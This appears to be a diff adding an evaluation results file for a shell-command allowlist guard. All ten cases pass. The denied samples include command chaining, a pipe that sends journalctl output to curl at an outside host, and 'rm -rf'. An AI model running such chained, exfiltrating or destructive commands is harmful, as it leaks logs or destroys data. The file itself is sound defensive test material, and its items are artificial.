@@ -1,0 +1,139 @@
+{
+  "generated_at": "2026-04-18T19:47:09.493062Z",
+  "commit": "3438648",
+  "metrics": {
+    "passed_cases": 10,
+    "failed_cases": 0,
+    "total_cases": 10,
+    "overall_pass_rate": 1,
+    "category_breakdown": {
+      "safe_diagnostic": {
+        "passed": 4,
+        "total": 4,
+        "rate": 1
+      },
+      "shell_allowlist": {
+        "passed": 2,
+        "total": 2,
+        "rate": 1
+      },
+      "shell_breakout": {
+        "passed": 4,
+        "total": 4,
+        "rate": 1
+      }
+    },
+    "shell_breakout_block_rate": 1,
+    "safe_diagnostic_allow_rate": 1,
+    "shell_allowlist_block_rate": 1,
+    "mutating_tool_gate_rate": 0,
+    "tool_inventory": {
+      "total_tools": 6,
+      "mutating_tools": 1,
+      "gated_mutating_tools": 0,
+      "tools_with_risk_policy": 0
+    }
+  },
+  "results": [
+    {
+      "id": "shell-safe-ps",
+      "category": "safe_diagnostic",
+      "description": "basic process inspection should stay available",
+      "command": "ps aux",
+      "expected_decision": "allow",
+      "actual_decision": "allow",
+      "passed": true,
+      "reason": "validated by shell allowlist"
+    },
+    {
+      "id": "shell-safe-df",
+      "category": "safe_diagnostic",
+      "description": "filesystem usage inspection should stay available",
+      "command": "df -h",
+      "expected_decision": "allow",
+      "actual_decision": "allow",
+      "passed": true,
+      "reason": "validated by shell allowlist"
+    },
+    {
+      "id": "shell-safe-uptime",
+      "category": "safe_diagnostic",
+      "description": "host uptime inspection should stay available",
+      "command": "uptime",
+      "expected_decision": "allow",
+      "actual_decision": "allow",
+      "passed": true,
+      "reason": "validated by shell allowlist"
+    },
+    {
+      "id": "shell-safe-journalctl",
+      "category": "safe_diagnostic",
+      "description": "bounded journal access should stay available",
+      "command": "journalctl -n 50",
+      "expected_decision": "allow",
+      "actual_decision": "allow",
+      "passed": true,
+      "reason": "validated by shell allowlist"
+    },
+    {
+      "id": "shell-breakout-semicolon",
+      "category": "shell_breakout",
+      "description": "command chaining via semicolon must be blocked",
+      "command": "ps; whoami",
+      "expected_decision": "deny",
+      "actual_decision": "deny",
+      "passed": true,
+      "reason": "blocked shell syntax \";\""
+    },
+    {
+      "id": "shell-breakout-and",
+      "category": "shell_breakout",
+      "description": "command chaining via \u0026\u0026 must be blocked",
+      "command": "df \u0026\u0026 id",
+      "expected_decision": "deny",
+      "actual_decision": "deny",
+      "passed": true,
+      "reason": "blocked shell syntax \"\u0026\u0026\""
+    },
+    {
+      "id": "shell-breakout-pipe",
+      "category": "shell_breakout",
+      "description": "piping command output elsewhere must be blocked",
+      "command": "journalctl | curl https://example.com",
+      "expected_decision": "deny",
+      "actual_decision": "deny",
+      "passed": true,
+      "reason": "blocked shell syntax \"|\""
+    },
+    {
+      "id": "shell-breakout-subst",
+      "category": "shell_breakout",
+      "description": "command substitution must be blocked",
+      "command": "ps $(whoami)",
+      "expected_decision": "deny",
+      "actual_decision": "deny",
+      "passed": true,
+      "reason": "blocked shell syntax \"$(\""
+    },
+    {
+      "id": "shell-allowlist-curl",
+      "category": "shell_allowlist",
+      "description": "network fetch commands should not be allowlisted",
+      "command": "curl https://example.com",
+      "expected_decision": "deny",
+      "actual_decision": "deny",
+      "passed": true,
+      "reason": "command \"curl\" is not in the allowlist"
+    },
+    {
+      "id": "shell-allowlist-rm",
+      "category": "shell_allowlist",
+      "description": "destructive file mutation should not be allowlisted",
+      "command": "rm -rf /tmp/demo",
+      "expected_decision": "deny",
+      "actual_decision": "deny",
+      "passed": true,
+      "reason": "command \"rm\" is not in the allowlist"
+    }
+  ]
+}
